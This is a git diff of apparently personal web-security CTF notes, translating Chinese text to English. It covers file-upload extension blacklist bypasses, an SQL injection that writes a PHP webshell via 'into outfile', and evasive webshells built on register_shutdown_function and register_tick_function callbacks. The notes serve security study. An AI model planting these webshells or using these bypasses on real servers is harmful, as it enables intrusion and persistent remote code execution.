@@ -116,26 +116,26 @@ $😊 ("`|" ^ ",/");
 在`Meepwn Quals 2018`中，使用了這個無文字shell，如果礙於底線，也可以換成表情符號...
 [VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)
 
-# Bypass blacklist extension
-文件解析漏洞  
-除了`.php`，通過conf模塊的regular expression：  
+# Bypass blacklist extension  
+[服务器针对文件的解析漏洞汇总](https://mp.weixin.qq.com/s/f0y_AjRtc4NjEqeJe6cPhw)  
+In addition to `.php`，with regex in conf:  
 * `.php3`  
 * `.php4`  
 * `.php5`  
 * `.php7`  
 * `.pht`  
 * `.phtml`  
-以上副檔名也都會被解析成`.php`  
+can also be parsed as php file  
 * `.php.xxx`  
-在古老的版本中也存在**多後綴名**的繞過方式  
-原理：apache2特性由右至左解析，遇到不認識的無法解析就像左跳！  
+In old version  
+apache2 parse from the right side to left side, until it recognize the extension  
 * `.php/.` 
-值得注意的是 這招無法覆蓋舊檔  
-原理：php源碼中可以看到用遞歸的方式將檔名結尾的`/.`都去掉！  
-[源碼審計](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
+What's worth mention: this trick cannot be used to overwrite old file  
+php would recursively remove the part of `/.`.  
+[Apache2 php5 conf](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
 * `move_uploaded_file()`  
-配合lstat()在這個函式中的使用，可以突破`/.`沒辦法覆蓋舊檔的限制。  
-[參考自家筆記](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)
+With use of lstat() in this function, we can bypass the above overwrite limitation on `/.`  
+[My own notes](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)
 
 # SQL inj to webshell
 MYSQL:  
@@ -148,12 +148,11 @@ union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
 ```
 
 # Dont delete my webshell
-筆記一些好用的木馬免殺  
 ```php
 <?php
 $e = $_REQUEST['e'];
 register_shutdown_function($e, $_REQUEST['pass']);
-// 結束時callback
+// callback after shutdown
 // ?e=assert&pass=phpinfo();
 
 <?php
@@ -162,7 +161,7 @@ declare(ticks=1);
 register_tick_function ($e, $_REQUEST['pass']);
 ?>
 ```  
-關於免殺的部分，還可以參考lemon師傅的[Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  
+[@lem0n Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  
 
 # Reverse shell
 目標為內網主機，外網無法發起連接。反彈shell就是webshell發起一個shell到外網，就可獲得目標的shell控制環境。  
